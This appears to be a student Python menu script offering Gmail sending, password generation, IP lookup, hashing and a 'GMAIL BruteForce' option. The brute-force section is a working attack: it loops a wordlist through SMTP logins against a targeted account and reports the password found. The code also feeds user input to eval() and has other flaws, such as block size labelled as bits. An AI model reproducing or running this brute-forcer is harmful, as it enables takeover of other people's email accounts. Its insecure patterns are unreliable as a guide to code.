# Libraries Import

import string
import random
import smtplib
import sys
import socket
import hashlib
from tkinter import *
from tkinter import filedialog
from tkinter.filedialog import asksaveasfile
from tkinter.filedialog import askopenfile
import tkinter.messagebox

ico = """
                    #########################################################
                    #         PYTHON - ICT PROJECT - HELPER SCRIPT          #
                    ######################################################### 
                    #                       Developers                      #
                    #########################################################
                    #            DEVELOPER-1 : Muhammad Talha Waseem        #
                    #            DEVELOPER-2 : Muhammad Talha Naeem Khan    #                       
                    #        Mail Address : muhammadtalhawaseem@gmail.com   #
                    #########################################################
"""

print (ico)
print("\n")



#************************************************************
# Menu

print("1. Send Mail \t \t \t \t \t                   2. GMAIL BruteForce")
print("3. Generate a Secure Password \t                   4. View Your IP ")
print("5. Convert Text into Hashes")
print("\n")
a = eval(input("Enter Choice: "))

#################################################################
if a == 1:
    print("         ")
    print("[+]  Welcome to Gmail")
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    print("[+]  Service Started!")
    print("         ")

    #print("Please Connect the Internet!")
    user = input("Please Enter Email     :   ")
    passw = input("Please Enter Passsword :   ")
    if server.login(user, passw):
        receiver = input("Enter Mail-to Address  :   ")
        msg = input("Type your Message: ", )
        server.sendmail(user, receiver, msg)
        print("\n")
        print("               ", "++++++++++++++++++++++++++++++++++++++++++++++++")
        print("               ", "[+] Congo! You Message is Successfully Sent!")
        print("               ", "++++++++++++++++++++++++++++++++++++++++++++++++")
        print("\n")

    else:
        print("Try Again")


###############################################################################

elif a == 4:
    print("         ")
    hostip = socket.gethostname()
    public = socket.gethostbyname(socket.getfqdn())
    private = socket.gethostbyname(socket.gethostname())
    print("\n")
    print("               ", "++++++++++++++++++++++++++++++++++++++")
    print("               ", "[+] Host Machine Name : ", hostip)
    print("               ", "[+] Public IP         : ", public)
    print("               ", "[+] Private IP        : ", private)
    print("               ", "++++++++++++++++++++++++++++++++++++++")
    print("\n")
###############################################################################

elif a ==3:
    print("         ")
    number = eval(input("Enter The Size of Password (eg: 8): "))
    def random_password_genertor():
        chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for x in range(number))
    print("\n")
    print("               ", "+++++++++++++++++++++++++++++++++")
    print("               ", "[+] Password is : " + random_password_genertor())
    print("               ", "+++++++++++++++++++++++++++++++++")
    print("\n")
###############################################################################

elif a == 2:
    print("         ")
    print("[+]  GMAIL BRUTEFORCE")
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    print("[+]  Service Started!")
    print("         ")

    user = input("Enter your Targetted Email : ")
    passwfile = input("Enter the password file:  ")
    passwfile = open(passwfile, "r")

    for password in passwfile:
        try:
            server.login(user, password)
            print()
            print("    ")
            print("               ", "++++++++++++++++++++++++++++++++++++++++++")
            print("                [+] Password Found : ",password)
            print("               ", "++++++++++++++++++++++++++++++++++++++++++")
            quit()
            break;
        except smtplib.SMTPAuthenticationError:
            print()
            print()
            print("[!] Password Incorrect: ", password)

############################################################################
elif a == 5:
    print("         ")
    inputm = input("Enter a Text You want to convert: ")
    hashmenu = """
    (1) MD5
    (2) SHA-1
    (3) SHA-224
    (4) SHA-256
    (5) SHA-384
    (6) SHA-512
    """
    print("  \n             ","  +++++++++++++++++++++++++++++++")
    print("                           HASH-MENU            ")
    print("               ",  "+++++++++++++++++++++++++++++++ \n")
    print (hashmenu)
    aa = eval(input("Enter Choice: "))
    if aa == 1:
        hash = hashlib.md5(inputm.encode())
    elif aa == 2:
        hash = hashlib.sha1(inputm.encode())
    elif aa == 3:
        hash = hashlib.sha224(inputm.encode())
    elif aa == 4:
        hash = hashlib.sha256(inputm.encode())
    elif aa == 5:
        hash = hashlib.sha384(inputm.encode())
    elif aa == 6:
        hash = hashlib.sha512(inputm.encode())
    else:
        print()
        print("    ")
        print("               ", "+++++++++++++++++++++++++++")
        print("                  [!] Input a Valid Number!")
        print("               ", "+++++++++++++++++++++++++++")
        quit()

    # hash.update(b'Muhammad Talha')
    print("\n")

    print("                ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
    print("                 [+] Hash is : ", hash.hexdigest())
    print("                ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
    print("\n")
    a = input("Press b For Veiw Block Size of this Hash (q for quit): ")
    if a == "b" or a == "B":
        print(" ")
        print("               ", "++++++++++++++++++++++++++++++++++++++++")
        print("               ", " The Block Size for this Hash is",hash.block_size,"bits")
        print("               ", "++++++++++++++++++++++++++++++++++++++++")
    elif a == "q" or a == "Q":
        quit()
    else:
        print("Please Input Seriously!")
else:
    print("    ")
    print("               ", "+++++++++++++++++++++++++++++++++++++")
    print("                  [!] Please Choose Number in Menu!")
    print("               ", "+++++++++++++++++++++++++++++++++++++")



